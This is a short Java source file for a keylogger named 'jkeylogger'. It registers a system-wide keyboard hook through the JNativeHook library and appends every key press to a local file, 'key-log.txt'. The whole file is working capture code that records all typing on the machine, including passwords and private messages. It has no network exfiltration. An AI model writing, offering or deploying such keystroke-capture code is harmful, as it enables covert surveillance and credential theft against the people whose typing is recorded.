package jkeylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class jkeylogger implements NativeKeyListener{

  private final Path keysfile = Paths.get("key-log.txt");


  public static void  main(String[] args) {
      try {
          GlobalScreen.registerNativeHook();
      } catch (NativeHookException e) {
          System.exit(-1);
      }
      GlobalScreen.addNativeKeyListener(new jkeylogger());
  }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        try (OutputStream os = Files.newOutputStream(keysfile,
                StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
             PrintWriter printWriter = new PrintWriter(os)) {

            if (key.length() > 1) {

                printWriter.print("--->" + key);

            } else {
                printWriter.print(key);
            }

            } catch (IOException e) {
            System.exit(-1);
        }


    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
